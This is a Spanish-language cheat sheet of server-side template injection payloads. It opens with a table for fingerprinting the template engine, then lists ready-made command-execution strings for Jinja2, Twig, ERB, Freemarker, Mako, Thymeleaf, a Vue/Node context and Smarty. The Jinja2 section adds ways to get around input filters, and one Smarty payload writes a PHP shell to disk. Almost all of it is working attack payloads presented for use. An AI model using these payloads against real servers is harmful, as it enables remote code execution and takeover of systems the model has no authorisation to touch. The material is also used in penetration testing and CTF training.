# Hoja de referencia de cadenas de inyección SSTI

## Identificación del motor de plantillas

| Payload de prueba | Si el resultado renderizado es | Motor |
|-------------|--------------|------|
| `{{7*7}}` | `49` | Jinja2 / Twig / Twig |
| `{{7*7}}` | `{{7*7}}` | No es Jinja2/Twig |
| `${7*7}` | `49` | Freemarker / Velocity / Mako |
| `#{7*7}` | `49` | Thymeleaf / Ruby ERB |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `${7*7}` | `${49}` | Freemarker |
| `#{7*7}` | `#{49}` | Thymeleaf |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `{{config}}` | Objeto de configuración | Jinja2 / Twig |

## Cadena de inyección Jinja2

### Ejecución básica de comandos
```python
# Método 1: os.popen
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# Método 2: import directo
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}

# Método 3: lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# Método 4: cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Método 5: joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Método 6: namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### Búsqueda del índice de subclase
```python
# Listar todas las subclases disponibles
{{''.__class__.__mro__[1].__subclasses__()}}

# Buscar el índice de una clase específica
{% for i,c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{i}}{% endif %}{% endfor %}

# Índices de subclase habituales
# catch_warnings: normalmente entre 132-140
# Popen: normalmente por encima de 200
# _io._IOBase: normalmente entre 80-100
```

### Bypass de filtros
```python
# Si se filtra el punto → usar |attr
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# Si se filtra el guion bajo → usar \x5f o request
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr(request.args.c)}}&c=__class__

# Si se filtran los corchetes → usar |attr + __getitem__
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# Si se filtran palabras clave → concatenar
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('id').read()}}
```

## Cadena de inyección Twig

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

## Cadena de inyección ERB (Ruby)

```ruby
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').readlines() %>
```

## Cadena de inyección Freemarker

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Cadena de inyección Mako

```python
${__import__('os').popen('id').read()}
<% import os %>${os.popen('id').read()}
```

## Cadena de inyección Thymeleaf

```
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
[[${new java.lang.ProcessBuilder({'id'}).start()}]]
```

## Inyección de plantillas en Vue.js

```javascript
{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}
```

## Cadena de inyección Smarty

```
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
```
